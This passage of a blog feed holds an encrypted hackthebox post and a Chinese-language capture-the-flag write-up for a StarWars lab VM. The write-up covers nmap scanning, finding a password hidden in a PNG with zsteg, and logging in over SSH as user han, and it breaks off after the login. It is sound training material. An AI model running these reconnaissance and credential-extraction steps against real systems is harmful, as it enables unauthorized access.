9f203cecb21834b240f2337a52a2ef71cc8ee6caa6dd9d566a1ca6550f5aa46ab73b030e86fb563ec1d0e960b4871c151ae1e3f569278c369962107ed2bf10a283047445f0a60485766b75d74f3b7ae71270939eef36b38eb1cc7fd1229c558b0fb1a7b2422b5005df3808bab10d19f57c36f1a3a6c6e32f4d427f079e090a8b7954f303fbaad5e43dff955986631e5e6869d51aee433f9983e34d2b50d19bbe3913d74643c7f872ea03b14f5e53ee433091b8b55972dbed37a480329063f7f102be4ec8517863bed3794f833516c21e18b494950461eff10f2f1cc4bd50d9005b7a37ff7c09e96b6972bc1bd81da03eb87cf2ab823654238dee4326bc0c6bd7f754781ce4fc8e16bd1fcace88ea73b8466c9d49663b1c550174a8647989cc69828c66a8179c478ab04c64ad06d3e46264cb2de101b07cb16d8535934c62c74b24403eac1000f3be20806741d5c79a3559f55577b127d303d4ce87c4421366a0a396dcb448b01f9bc4c83a71c96b31ee083d4b9f021a7b0ffae996b0cc8830f9fe435423862c5227e118a55deeb182af119d4d98c8d7e486e107776b8584e41264a3076981e9c79c34d99a7cdb0cb299c3de23861f75647792c09291208b79a8b609537a4dda0e8546c1141a3dbe3ebd4360bd447b41a81c4a06a13b32ed3e76f7737d9dc0d2cadb368300247fea7c5d2bbf572985f02c11b5b6038b40eda8c3c21dfc86a6ce6acbaa1b7d806f29124c24393ef2c302a98364033b4cdddbe7dc45f307c64b7516d212fdc15c9275b1b4dc5d56c87a9ab777e7b12dd03c1e2c78258817feae054287ecb071e2c48c0a70e691a85e8f37156fbf522ee9cf21df5ee470ad31210f7df25c53f1293344cd94ab8e5249ae9f16981f0078881732c4df900ecee89855f1bfddd72f3248c503a646240e8f02ca8c2a6ddf35898d99038fe0c36eb8cb3333977ba8c741f615932a5c65a07972a2a5824b2c8799ca52c56a184128d5c42a2cbdc7ba82074f65ca7e335d858548331d7eaba1d6f3c3b635da2a591939e5825010ef20b8f1b8aed3570d3b86e97f93cfc3fea84fccc01f5cb579999e76a0dfa83b077ba2abf7eb01c507dca2e27d31699d762ec7bd8ffacf246975ea0fc4c9ef0f6a9d1d03d27e5b6dfe597cbe062e033e5fde9bf98f2ad2e5e1f6f3e8e89d924b3550a8fe0a5ead5b73fd5d8f2a6ccec7416841228ccf0daa33abb92f7b7b2c6ab0110d37b4b2497147042c0034e826d148d5f27eee246db2f2c8058e4dd9b8bd11e8057b165fa35b13f9a24d55c8d0710062f36c5bc2a7767207789ef433a96f987c59e7136faffc979f7df9e1306a29f2bb2814cbf4a843e8d9ed22ec97fd130d4b380e797a15e1f1b22091a95f1803efc5998806e6564c4f8f4ef95a537a85b54accebaaef7e9eb7c21e9446e61f245b143149f76884d17ba7e5e77aae16b907a26b16fa1669a1bbce2e5504a091230960ad7ecd398ac3d695fc7900d18b3ea61c793b80ec48a40d1d2785577b16e167afa1213715d0700632f8684551b68d1a27d87e19caca446f04da16564504614ce14c72810b3b7501eaaa3992dcc818822a57185e560dc69eda1b21100a9bf42f2fd3e24e3d2d2c7dc3a3b4cb08fe79629e5bfe15927c7bb5c94dd0111ff54c14bd091fe265b8bc19893abbe4840896ee6557d47b477acf8cc2d42c68157587403466d20091138892661ad0499c4cd081750c71ce40654ad9a4f347ddae10aea0dd9e72aefdab51e1d90a6e56f92a3c1ca73e1c905bd4654b59feb4fa7b6705e4a2ad03866b25b56cb74eb346c4f9ba82a527838710e5b37f930fbf227703d4f6d44297aa53324b1b49cd351b0af7c0de7b6f3cc7f75ec2dff05fc1513d8efb10fe8581ccb87cf8ae5a431ba9c02111cdd43220cf95a59ad2c36e2068ece7df6d80cd019d3b0c28cfca21b08f37c0a84a377cbffc7132672b09faf68da6aea3447c8e5ddedbb32d5db54344f679137849c6ab682d80c4990acaf7c566b35f563f5fb71fd96faa1ff77f394d9c28873048be9588adc3c0f83fbe7c4cefaee85557998459aa0b90ff9b8f2d199613f9a886d49b91f1b98f37cc378c4d1a06e4b55ab1e0606400600870dce93c418e0a6ba809f518374761b111ff8819cc4191bf939ef859778d1a285784789e715301d13df442cfaddcae148c2734ee48d0975d8e29722305506e9ab36ed959cbf12ec3e07ee994cb0a2c39fbb15a3bb5aa6fed1742bc2460d2dae7a55ac9cd8cb8c1bc96ef0ade0d30fed9fb0a2298c89bae121df7b30c1f97b4d7ae3f80b2cf2bdb63bc1e89c643af2a7d245076b6de5cec6475bfde503dc9fd008dad449707676b174066c924b6dd80663448f8a22fbe7f5655328f09c8b4923f56443a37c3fd55c7cc1b374fa150eec08ac898d4a766a1c2eaafdddbade22f88813d51f8cf41e5f5effda59007cf998e0dd9c2c4acb03e18ef43ba40015556c74df1d760715df2066c8212e6c1868e6e699db8778fdd426b0a71e038ee95e0978ee7ff46bfc84cf0c4bc09a0ffad7cd50c0dcbf5c3ad6ff87ee70726afd362e67ae20819871d9dc1f145bb43513daf293d21d4f8d04fdd51c81cd150d342d1651a4e420b6c6dffae79440f029cd7b4eeaf623107c8ddfe83d05f40d0533e26194d3ebed1f759c0f09aa3bb861fb3413cf6a8bc396cbc993a0fb54d5b884d7ca2306687f7a2b9fae9a416ee447687e53856ff273b1a2e8b27d714daca8b22099fd1c70b222655bc4b091d7c440c7bf46031b0d29a3bb86e96e6d77daf9afa492dd88af1dfb375c5bb6e86993cd85f72e993691cccb89df2f6569d5cd0a105bc14748c6bc642e1d33698eb447b688f9cbc0d9cf442c0a8fe362d8e00e0d08a5654d8ab9604661cbaf3409fed3281a5314fb381bccbfc08395153f28b6802d7782482fcea3f9145e012f4469638959c168d0eb224204e178bc236a40c6bbe636cd8d0d47eb54162a568221367bce673a577a6c48f22a63e88939e1ee804a0e81b2243df92930a08616a8ae8d135651ebbbb1fca933863f7f6e2e19f6d6aad11be59e4e27c0c11bb696b586b97df1c8ff0cd68130e30f84e3823f0f0504bac2378a4122cc4850a253bbc348ada2d96e15648cfef8404f6fda79922e50412bb4c728dd6002f8c7c982884dbbb83bd4b0a98c2fb7936ba34932c59096da325db02e69c509404dd235ecc5604a4ea9e76f24f8d84c47764480ccee88b987ad9446256b1a5647a1af23516e0d3b00cc50f70f299453155b23c256285a9309ae11186265338ce435768ec01abe715ffe05cb7d0d422d8e7a20c24b6a159e3fe3300ff67cacb2ea285cd1afabd300a5361c73ee46af8a9e410b064e4cda7041683c65d65ddc1f72f36abe9d45359c3850a294264a243e77bc1cb52b413fdf710bf8b91023663827e4f63da39b18a704fdcb7f7ffcaa9bc6e48027fc4a5f155b195d42662e94d8b7c01b4eccfb46ff4fc0a80cb88a617202b852c75a202d4ef3a21ce393facd8a5898ff5881a76d85cebf9ebbcfb259c48c2281c4bdf3d2537acfe7a609bfdea0ef5b163b33c43f7d5db1075f6af7b9eaadf99e3331d6dd093f07217f73349f01cd711afb5f7adbd265e2cbebdb3e9bc46319984f18dfe4b9f34ad9429e7b3e4b781f2d8b3b2f448af4527a188e6a1fe048fc0e0b9f55600fecc78d056a274d2df707c90ce451efd2d009d46b0d312fa4e9cefa76705863eb9420d712dd8ed41d38237ab69b6f12fa7f6f15adc56f876c67c4ae25a4afef3eb49beb6a0a4065c7b855904e222c268626379fb7f6b055583b372b3e2b636a9d0257b9cdcb1dee28835ae8d366830bcc1b80fc12dff36739d6eb7e5b381027252241a7b0e917f496864aced4156504bf679cd7bfa9b3cacb1de6aab2fbf5d1a5b21e778a5bc2dff9c7838a448ede8757f1256198a8849b65a6badca61f201296e85c92c29863951de39b73092022083d6f5761899797e930eed461d3606e59d851ab1218113f7da4fed13933ea199329e05fcf3e10b4ce3afd742f229ca1d6a73b47144f3a4822953cd7c77256a8028bbd856bcbd0e76c93367d5241f878aa9bca8651bc3961b6298307cd22d4397f6b693765626e2b363f390760aa42a39efa74414bd3845cad6bb96aba78f824452e01c0e369d3ee329f41426f5d13ab208002515b2fdae711f0f37213fb9cc4652cc98436c75eb02ad99ca6e6bc68fc44dd94b79c58e20bd6c227dab380721f5a2ea8aa592a23c61ad869a0b9f7dc0ffb0fca241bd14799b9c1316d42504f0c1a330ae57d3fc4c34d4fd4a88d70fb5fae8f007a06d2af16e053bcfdb4fec72026f9d63799c2869dc49cdc5a47a491d197d022203673f634eee44201280a8dac559e2e297976d68a8272fec3d528e6435a9b6b558a433fa3494f9f029af9b1dfe78ca8b936dc27a97b42e51454b5700e8e16f10f4e692924ac0fc60e7f26a22a6486894f75c770b6d270e47053425fc616e55a47ae752ddaa7ae08f1541e7542bb50e803838215aa613b82d493244db60c4d7cce3945a41d92126397fa5dd640f68e32fdc89fbaf677a1dd413204be58f62d44cc1e6e0f5cc6034843bec6aaa4eebb2d4c0484a9ce2f64b669fbe7f3d6b8fcd8cc964966f19ac1405500009eebb5f74e38f01d9246b09c5955b330b725f679022f6692b5e1f78ee21e460766f0ca0ead64616d8416f979454e9d3db7fdba03f226b07c93e3b2fd841f54d8fc9be55415de0aa7382c162df390a2b9267f7aefbd42dd72401d127914c510c69490760a1b45be74a7f2b98bb230030112933d395dbdb98d8f456b1e6ed23630398aae819ce00fd2219ac94761994e1fec74fea46cb55f3fff55a538cbeb142599cae6b588facfc35ad0d95180c1e2656d1ff2ccd315e4e6a3bcc243acd2a6758e81d7bdd2c619e152f1a39fa98d0030e7a14130d9fef3d27e2d172e5dd9389d78267fe62d33d908d9344014dc880bbf187f79407772256b70bf64968471ab77f87bc69efe2c895ede8eb036fb394ebfcfdd7563890ff8595579365ebb9bec5e49ab2478d3e57a04fdac8859311d226eb854a6bac008baf9b6c731cb5ee6a9525fb4a48ebdc8d7bad7056e7c4de9d1f245216f518d708eabfba6efd108ba94f0117a6e53a45f63aa75978ba55f52ab87ddee0a367bcc6d2c296bc0464a18cf9ef86abd529d0dfd0d9f225b9ba5dc7628849a2732bb7aa2534d57a4041e7dddd5e0fb0d925f7dcf9da720a8be694a82d682a6c856b6dd7fa018322c7b8338650fa8c18a50ede5790f12da1959fdbc9b568f8483c089851e3551f9081001a70bce72846129d075852f204db7f0ead38dfd5c6625b7bbfd7b5af627eca81d0e6f69f6180719682607ec2493a66c283390a414f05d91bac8409c2e076b84e35e278290eb423ba3ba8fac49e7b28af25a617bbbb14cc98a799bfd19d8ca0bca4363e08d6b8ba852bd317bf1b1488a8fd29138fed09abe44e087d95507189eb874f4f19d516e21ffd57620be04e22822c7545cbc90b5a0cc2b1e4a2c70c7c8496d58d747e026f69b4a6922967eceeb7b949a027bdac64a1e8f8fa4df5b58ec3ea19c4efe218b1f1880599687fe80b2eb5dc1ca9d3c6b0a0bcbdfcd6d375e2c7a7eab701d6c5d770ba522d03de448a74d8282f5d052496aade2ba9fda35d362e6e3262135193b00931e160a31394bf861463e0a7253b63f5349475c9aae2f72398f57a88ea0310ac644e0d71a6a3485dc6aaf68d49a4304870d6d612a291171209545a8d6bbe56b1532977f6e20e2f5b805ea429c28bcacd4bd2213a53f2e67228c72e1d7eed91e33900b5af3d4215d318718d9ed8fa0435f8cc14c7d54e2cff52653420f3c8fb2cf731b841eebdc89c341cfc58f95fad05f63c4b9171c67a716a90349bce2fcb860f66ae29f65bd1467fe3db4f128358ea361467bd6b3dd82ac3721503e9a92c77eb98cb5ce4ecf9e6f2622b5f883e773a564f9b35780c60bb5eec054d14f260ff37bd09af407dfe1878f375e6c893749de8b79ad737123f363cafbd80a9405e337f6203115f4debcaadfa8ddb3363a5c649d4eb41f2451b2823b16f2a04fba83bea41bb138ca36218172c91fe0948f97e836423ab9dd9661412d991f11eaefd974351d1583cd71a17713c7064ef58c99a87d2ffd0e13fd02740ea5a601ecf8fe29682556ffe4bd90fd70f8d9637d0c38f4adea84b466ee852adfa842f4840c27153e1756e06f5d661b8b5b94fd46f3a0b87d198ceecb9112c3778b5136c2d7575c1f30bdd4a07dbe911c4193046b7eecaff73e7b4bde61ce6e0c62b6e2969ef33ddabf7ab51b4a27967c71b26100b742b5898849d2fa5081798b5fa4864b9bcbb8c248ac7d254283a2093e5f16f911474f217fb932ba34d44eb427da979bf95744160d30f0127323ce8ad465d2b05734e1f9012c12881ef347dcbbc3ac6a16e6ea5fffb79a6d3917d1d635f4ede5fea45488b8d9c7d147f0a7dd27890507b72e5c2aacdad35cb59734b5125598cecf115ffc612b292708d2490625355c285ee5b0f4561595ee724a46ed82e8dd4eaa39790333240fc460e762d9459dfbe5e18351c2c7ac598ff2ee697b18ccd37598f717b6d7ca392c484096b77e828e1254ca52815f1561f6f1c0d9192774799517e244b9c426bc66eff2bcada9704a993321a25d6e89560f404256106a3c48f6f6fcd89472581b23a01e4f81761ff136d8a5536572ae49c1dd2bfac92fb3ae5aa867d45131d397ebef073f969d3650acdca8b24880cc66edeb368a8bfddcf908f5017bd6c4a5269ead49cb6a93678693f77886968e1ad4910049d370b083c741cd6d9b314b85d2bd95662c2d0255090efe9b2d4d96df2ca40695fb52779728b44ba7bce0d9afe3704a9c945eaddf4ad58c9d58f7f1b38ae520708ad5dcd5820f1df9c3c104fd7a13be85da0af9424a098f29c2a41f7d215f126264828ff8c489caea1b9b8b1514c38298cfeceef9d2879e7e395c122122677fe63627f764cbb221b0d6ba5da6617779500592355a5c710de598679d9fb5dd8a2b254581749c1813ecd6abedfc192e8b069d0ef4ba9cb3af225588e69339a330fc595eb4d0775923c5787117f778fcbd48b68022cdfb0c850888412747272b28290bbfc13aed174a125cb12bb59d5fea74c38e474577b8d27ab07c42508e01c5ae2db38f03c3c9c4b758203f6c69fd8c617cc5c2476170f65a1d82c21b9573528f5211dd3494f51b0f622f21bcbb1d4935944f72b419233a858a33bb31a8ccd5c54535a7906339a9043878545161eca6aacb7417c896b4fae0cdef4030576ac2eb852308e11489718e13fd66616df4db8f3ee43acb8b0fd4740b4fd13c0b4ed7101f7ed8fb1609c15d83f1fff54c3f8d1be7f0f3ae7e1211df976cf4e1e9015807be7e20435b175a58843d648924875fbb9110c2bbdca93a3d4bdac7a23280630622610fd8523cfd4c61bd95fbc64b58bf5509e7f0f0fe9ae5967f24fffd3934933a89a944d6202eb2fce128effc42b48eed870bd1d02e7814c93fc98091fa8ad2d2bd4226be5a1f412bcc6865f07e9136a375d5ed6b290a362a64bc467e4527effe8b94c1da78763edecfcac31f42b2917e4ca6c6df6d6b7a9999878a4695cb7685d661c9645cf228f2e1b5eb17a724fca1b34c5aa569c1d59a9c9d07cd1f597ea14b8014d6340c3f2b90c5e0fe3da07a6a87f542a548a28c6af5ee238313f4349039629cb5c6fd2860ffd6c90c090fa23f673f529705f995ffaf7d0730f6e4130288792d369eca59e1433ea64dc481d1526726015415a4a8d7a3d550ff37bc42997d9fd7a1dd5a6a98a1706467be7dba26ed90769d9120da3c6c1887b98569f9d5465b6e161fc8572263745b4faf55ddac0869f04d7ee3af4ffe291583f433447c500538895179791dee1dae2eab23b0162e764b233900839e71f6892fef1c30528538e31b509a99e778a30a28e8bf462779e3d2b1a5de7325ca7a90f645d1e7f3ad0a8faee897ac5911c15a6c564948c9385fe3f28ac9d7370cfba1c287e02b7811a7d56a09817b3fcd9e9a92b97ee17d1f1f00f0e355c0f4367f672cf2b540622bfe60a2ca35fb20220a64bef049d3a177b53fe72e8b6f6279dde647b28285a98d82f37d5d631547390cd3c7b796cfe02987ce55b4f37c3a159cd535e056b630c193da38c8e254449a7b217b342c0f5049c28704ecd4e24d4f3199d6e5713afbf2d49c20b157b2dfdd0db7f77a6d4afacaad6a34cc9b98d06246372cc60cc688415383a2abbc6ce1ee2c2838ea29667dcc75401e6e7d5db378d64261707d9ab1ddbf1790141050792c067b3ee177752757780239721bcaada369c1dd12c631922925189f69bf0e2420dfbea905f24dc2a750469e2e37bca2f1daacada777f2b06423a238d67cbfc7529c42f0228090638f7485394df947798bda6398bde7558de17ca97364302f7a230477b5c01826534896c68b06074c8c811b2fb050b15c7ad078527d4cd3881af28ffb331c4a52db8c126f3b1f602815d386708be3dafc90856cf44e9885aaefb437a2a8508622e95986799ef469a7bcc2957b2b5066693436794fc27ddb3c36ffddccbe7eb30d97fb7df82775a1c94ec10c4d5307fc0398e6709474fa6188beace1130c483bb37e7c8fa4ca14bf41980b1c75b0fde8f5cbd0bb8fe900d8b219a72303c93f9b9ce38c34f4ce507664813e9f50e6d72a7d0a01f8b9aedee3fc54460de74aa0af17eb1486016a0477aad17cb53df4500ced6bd3449dd32e0ff96dfe8dfdd83d55dd24f4ad83975f138dcaa70a890cf2905469bd32ab5574</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>knowledge_database</category>
      
      <category>hackthebox</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>StarWars_Epi1_CTF靶机</title>
    <link href="/2023/09/177299db5791.html"/>
    <url>/2023/09/177299db5791.html</url>
    
    <content type="html"><![CDATA[<h1 id="StarWars-Epi1-CTF靶机"><a href="#StarWars-Epi1-CTF靶机" class="headerlink" title="StarWars_Epi1_CTF靶机"></a>StarWars_Epi1_CTF靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.147<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 06:54 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.147<br>Host is up (0.00044s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:83:80:40 (Oracle VirtualBox virtual NIC)<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80 192.168.56.147<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 06:54 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.147<br>Host is up (0.00040s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 4c:53:4d:b2:26:ee:a5:10:d4:be:99:84:2a:9a:aa:11 (RSA)<br>|   256 95:d7:a4:e0:74:63:4b:08:b0:a8:8c:dc:e1:f8:91:25 (ECDSA)<br>|_  256 1d:07:d1:3d:99:02:f0:04:ba:23:c3:a4:fd:0d:3d:91 (ED25519)<br>80/tcp open  http    Apache httpd 2.4.38 ((Debian))<br>|_http-title: Site doesn\<span class="hljs-string">&#x27;t have a title (text/html).</span><br><span class="hljs-string">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="hljs-string">MAC Address: 08:00:27:83:80:40 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 4.X|5.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="hljs-string">OS details: Linux 4.15 - 5.8</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap --script=vuln -p22,80 192.168.56.147                            <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 06:55 EDT<br>Pre-scan script results:<br>| broadcast-avahi-dos: <br>|   Discovered hosts:<br>|     224.0.0.251<br>|   After NULL UDP avahi packet DoS (CVE-2011-1002).<br>|_  Hosts are all up (not vulnerable).<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.147<br>Host is up (0.00025s latency).<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>|_http-csrf: Couldn\<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">|_http-dombased-xss: Couldn\&#x27;</span>t find any DOM based XSS.<br>|_http-stored-xss: Couldn\<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">| http-internal-ip-disclosure: </span><br><span class="hljs-string">|_  Internal IP Leaked: 127.0.1.1</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /robots.txt: Robots file</span><br><span class="hljs-string">|   /images/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.38 (debian)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">|_  /manual/: Potentially interesting folder</span><br><span class="hljs-string">MAC Address: 08:00:27:83:80:40 (Oracle VirtualBox virtual NIC)</span><br></code></pre></td></tr></table></figure><h2 id="Web-渗透"><a href="#Web-渗透" class="headerlink" title="Web 渗透"></a>Web 渗透</h2><p>先看 <code>robots.txt</code></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Why does <span class="hljs-keyword">the</span> Jedi Order keep checking <span class="hljs-keyword">the</span> robots.txt <span class="hljs-built_in">file</span>.<br>Might take <span class="hljs-keyword">a</span> look <span class="hljs-keyword">at</span> /r2d2<br>He is <span class="hljs-keyword">the</span> real OG. <br></code></pre></td></tr></table></figure><p><img src="/pic/6e247c18ce83b5eac3dcd3e4c6f2cd44_MD5.png"></p><p>文字比较乱，搜了一下第一行，没发现什么有价值的信息，或许也可能是作为字典，后续没别的思路了再尝试。</p><p><img src="/pic/7e286042c829ca4f958fc8bccb97572c_MD5.png"></p><p>可能是用户名或者密码，记录下来，看看 wordpress 目录</p><p><img src="/pic/7c16a56d309e950450e02d6bd39333b3_MD5.png"></p><p>wordpress 无收获，看看 admin 目录</p><p><img src="/pic/ddaab0d8894d08e9144d7b821d73f792_MD5.png"></p><p>源码中没什么东西，而且登录验证的 php 文件不存在，没法爆破</p><p>网站根目录中是两张图片，一张 jpg，一张 png，网页源码中有一段编码后的字符串，试一试 base64 编码，得到一串二进制字符串，再试一试二进制解码，得到真正有意义的字符，但是却不是我们需要的</p><p><img src="/pic/aca54e539a1212415868caa60c696c8c_MD5.png"></p><p>查看 images 目录</p><p><img src="/pic/0cb12a73f62a1e4bc890bd7cc47fac45_MD5.png"></p><p>发现一个有意思的事情，png 图片明显比 jpg 图片大得多，猜测可能有隐写的信息</p><h2 id="png-图片隐写"><a href="#png-图片隐写" class="headerlink" title="png 图片隐写"></a>png 图片隐写</h2><p>使用 zsteg 工具进行测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/StarWars_Epi1_CTF]<br>└─$ zsteg yoda.png <br>b1,b,lsb,xy         .. file: OpenPGP Secret Key<br>b1,rgb,lsb,xy       .. text: <span class="hljs-string">&quot;the real password is babyYoda123&quot;</span><br>b2,r,msb,xy         .. text: <span class="hljs-string">&quot;@@PTAT@U&quot;</span><br>b2,bgr,msb,xy       .. text: <span class="hljs-string">&quot;Q@DEADET&quot;</span><br>b2,rgba,lsb,xy      .. text: <span class="hljs-string">&quot;C&#123;/&#x27;kk?&#x27;&quot;</span><br>b3,b,lsb,xy         .. text: <span class="hljs-string">&quot;!<span class="hljs-variable">$u86Kri4</span>&quot;</span><br>b4,r,msb,xy         .. text: <span class="hljs-string">&quot;A&amp;W#Ff&amp;b5!&quot;</span><br>b4,g,lsb,xy         .. text: <span class="hljs-string">&quot;DhTS6BTgd107R&#x27;Vc&quot;</span><br>b4,g,msb,xy         .. text: <span class="hljs-string">&quot;6%a0g!f&amp;b5!&quot;</span><br>b4,b,msb,xy         .. text: <span class="hljs-string">&quot;RdT% \&quot;FD1a&quot;</span><br>b4,rgb,lsb,xy       .. text: <span class="hljs-string">&quot;n,HnJJL&amp;&quot;</span><br>b4,rgb,msb,xy       .. text: <span class="hljs-string">&quot;CRfgvf&#x27;2\&quot;cvU4#&quot;</span><br>b4,bgr,lsb,xy       .. text: <span class="hljs-string">&quot;.hLNjJ,F&quot;</span><br>b4,bgr,msb,xy       .. text: <span class="hljs-string">&quot;VBgvfg6\&quot;#rfT%3&quot;</span><br>b4,rgba,lsb,xy      .. text: <span class="hljs-string">&quot;so/O@OPo.O&quot;</span><br>b4,abgr,msb,xy      .. text: <span class="hljs-string">&quot;S/7_&amp;?a_B&quot;</span><br></code></pre></td></tr></table></figure><p>得到了密码，而这个网站的登录界面是无法正常进行验证的，只能从 22 端口进行考虑。同时我们还收集到了 <code>han</code> 和 <code>skywalker</code> 两个字符串，猜测可能是用户名。</p><h2 id="SSH-登录"><a href="#SSH-登录" class="headerlink" title="SSH 登录"></a>SSH 登录</h2><p>接下来我手动尝试了 r2d2, root, skywalker 和 han，其中 han 登录成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/StarWars_Epi1_CTF]<br>└─$ ssh han@192.168.56.147<br>han@192.168.56.147\<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Linux starwars 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">Last login: Thu Jul 23 08:18:42 2020 from ::1</span><br><span class="hljs-string">han@starwars:~$ whoami</span><br><span class="hljs-string">han</span><br><span class="hljs-string">han@starwars:~$ id</span><br><span class="hljs-string">uid=1000(han) gid=1000(han) groups=1000(han)</span><br><span class="hljs-string">han@starwars:~$ ip a</span><br><span class="hljs-string">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="hljs-string">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="hljs-string">    inet 127.0.0.1/8 scope host lo</span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">    inet6 ::1/128 scope host </span><br><span class="hljs-string">       valid_lft forever preferred_lft forever</span><br><span class="hljs-string">2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000</span><br><span class="hljs-string">    link/ether 08:00:27:83:80:40 brd ff:ff:ff:ff:ff:ff</span><br><span class="hljs-string">    inet 192.168.56.147/24 brd 192.168.56.255 scope global dynamic noprefixroute enp0s3</span><br><span class="hljs-string">       valid_lft 334sec 